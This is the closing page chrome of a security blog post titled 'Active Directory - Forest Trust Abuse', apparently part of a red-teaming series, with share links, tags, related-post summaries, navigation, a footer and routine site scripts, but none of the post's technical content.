class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Active Directory - Forest Trust Abuse - 0xStarlight&amp;url=https://0xstarlight.github.io/posts/Active-Diretory-Forest-Trust-Abuse/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Active Directory - Forest Trust Abuse - 0xStarlight&amp;u=https://0xstarlight.github.io/posts/Active-Diretory-Forest-Trust-Abuse/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xstarlight.github.io/posts/Active-Diretory-Forest-Trust-Abuse/&amp;text=Active Directory - Forest Trust Abuse - 0xStarlight" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory-Domain-Persistence/">Active Directory - Domain Persistence</a><li><a href="/posts/Active-Directory-Lateral-Movement/">Active Directory - Lateral Movement</a><li><a href="/posts/Active-Directory-Introduction/">Active Directory - Introduction</a><li><a href="/posts/CRTE-Exam-Review/">CRTE Exam Review</a><li><a href="/posts/Bypassing-Windows-Defender/">Bypassing Windows Defender</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Active-Directory-Introduction/"><div class="card-body"> <em class="timeago small" data-ts="1648537560" > 2022-03-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Introduction</h3><div class="text-muted small"><p> Introduction Welcome to my first article in the Red Teaming Series (Active Directory Introduction). I hope to provide you all with information for an initial foundation and motivation about Acti...</p></div></div></a></div><div class="card"> <a href="/posts/Offensive-powershell/"><div class="card-body"> <em class="timeago small" data-ts="1648612260" > 2022-03-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Offensive PowerShell</h3><div class="text-muted small"><p> Introduction Welcome to my second article in the Red Teaming Series (Offensive PowerShell). I hope everyone has gone through the first article of this series which explains the basic foundations...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Windows-Local-Priv-Esc/"><div class="card-body"> <em class="timeago small" data-ts="1648776360" > 2022-04-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Local Privilege Escalation</h3><div class="text-muted small"><p> Introduction Welcome to my third article in the Red Teaming Series (Active Directory Local Privilege Escalation). I hope everyone has gone through the first two articles of this series which go ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Active-Directory-Domain-Priv-Esc/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory - Domain Privilege Escalation</p></a> <a href="/posts/Bypassing-Windows-Defender/" class="btn btn-outline-primary" prompt="Newer"><p>Bypassing Windows Defender</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
